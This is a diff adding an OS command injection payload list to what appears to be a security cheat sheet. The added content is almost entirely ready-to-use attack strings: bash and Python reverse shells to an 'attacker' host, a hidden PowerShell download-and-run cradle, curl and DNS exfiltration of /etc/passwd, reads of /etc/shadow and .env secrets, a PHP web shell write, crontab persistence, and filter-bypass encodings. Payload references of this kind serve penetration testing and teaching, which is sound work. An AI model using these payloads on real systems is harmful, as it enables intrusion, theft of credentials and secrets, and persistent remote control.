@@ -3578,6 +3578,227 @@ Host: vulnerable.com
 GET /vuln.php?cmd=$(whoami) HTTP/1.1
 Host: vulnerable.com
 ```
+# **1. List of Vulnerabilities**
+```
+1.1 Basic Command Injection
+1.2 Blind Command Injection
+1.3 Chained Command Execution (&&, |, ;)
+1.4 Command Injection via Substitution ($(), backticks)
+1.5 Injection in System Calls (exec, system, popen)
+1.6 File-Based Injection (/bin/sh -c)
+1.7 Windows Shell Injection (cmd.exe)
+1.8 Out-of-Band (OOB) Exfiltration
+1.9 WAF/Sanitizer Bypass via Encoding
+1.10 Obfuscated/RCE Payloads (Base64, Hex, Unicode)
+```
+
+---
+
+# **2. Sample Payloads (Core Attack Payloads)**
+
+*(Basic learning/test payloads)*
+
+```
+2.1 Basic Linux Command Injection
+; id
+```
+
+```
+2.2 Chained Command Execution
+&& whoami
+```
+
+```
+2.3 Using Pipe Operator
+| uname -a
+```
+
+```
+2.4 Sub-shell Injection
+$(id)
+```
+
+```
+2.5 Backtick Execution
+`id`
+```
+
+```
+2.6 Blind Injection Checker
+; sleep 5
+```
+
+```
+2.7 Windows Command Injection
+& dir
+```
+
+```
+2.8 Write File Test
+; echo TEST > /tmp/test.txt
+```
+
+```
+2.9 DNS OOB Injection
+; nslookup attacker.com
+```
+
+```
+2.10 Curl-Based Callback
+; curl attacker.com/ping
+```
+
+---
+
+# **3. Sample Payloads (Updated With Real Payloads for Learning)**
+
+*(Common real-world offensive OS command injection strings)*
+
+```
+3.1 Full System Enumeration
+; id; uname -a; whoami
+```
+
+```
+3.2 Shadow File Extraction
+; cat /etc/shadow
+```
+
+```
+3.3 Reverse Shell Payload (Bash)
+; bash -i >& /dev/tcp/attacker/4444 0>&1
+```
+
+```
+3.4 Python Reverse Shell
+; python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("attacker",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+```
+
+```
+3.5 Node.js RCE Payload
+; node -e "require('child_process').exec('id',console.log)"
+```
+
+```
+3.6 Windows Reverse Shell
+& powershell -NoP -NonI -W Hidden -Exec Bypass "IEX(New-Object Net.WebClient).DownloadString('http://attacker/shell.ps1')"
+```
+
+```
+3.7 Base64 Encoded Command Execution
+; echo aWQ= | base64 -d | bash
+```
+
+```
+3.8 getenv Dump
+; printenv
+```
+
+```
+3.9 Internal Network Discovery
+; ping -c 1 127.0.0.1
+```
+
+```
+3.10 Data Exfiltration (Curl)
+; curl -F "file=@/etc/passwd" attacker/upload
+```
+
+---
+
+# **4. Bypass Techniques (Filters, Encoding, WAF Evasion)**
+
+*(Bypass payload list only)*
+
+```
+4.1 Whitespace Bypass
+;${IFS}id
+```
+
+```
+4.2 IFS Injection (No Space)
+id${IFS}-a
+```
+
+```
+4.3 URL Encoded Injection
+%3B%20id
+```
+
+```
+4.4 Double URL Encoded Injection
+%253B%2520id
+```
+
+```
+4.5 Semi-colon Removal Bypass
+|id
+```
+
+```
+4.6 Comment Truncation Bypass
+;id# 
+```
+
+```
+4.7 Substitution Bypass
+`id`
+```
+
+```
+4.8 Tab Bypass
+;	id
+```
+
+```
+4.9 Base64 Obfuscation
+; echo aWQ= | base64 -d
+```
+
+```
+4.10 Environment Variable Execution
+$PATH
+```
+
+---
+
+# **5. Advanced Attack Chains (Real-World Exploitation)**
+
+```
+5.1 Command Injection → Reverse Shell → Full Access
+; bash -i >& /dev/tcp/attacker/4444 0>&1
+```
+
+```
+5.2 Command Injection → Read Secrets → API Key Theft
+; cat /var/www/app/.env
+```
+
+```
+5.3 Command Injection → Pivoting Internal Network
+; nmap -sV 172.16.0.1
+```
+
+```
+5.4 File Write → Web Shell Deployment
+; echo "<?php system($_GET['cmd']); ?>" > /var/www/html/shell.php
+```
+
+```
+5.5 Blind Command Injection → DNS Exfiltration
+; nslookup `cat /etc/passwd` attacker.com
+```
+
+```
+5.6 Command Injection → Crontab Persistence
+; echo "* * * * * bash -i >& /dev/tcp/attacker/4444 0>&1" >> /etc/crontab
+```
+
+```
+5.7 Command Injection → Kernel Enumeration → PrivEsc Prep
+; uname -a; cat /proc/version; id
+```
+
 ## Insecure Management Interface
 Insecure Management Interfaces may lack proper security measures, such as strong authentication, encryption, or IP restrictions, allowing unauthorized users to potentially gain control over critical systems. Common issues include using default credentials, unencrypted communications, or exposing the interface to the public internet.
 
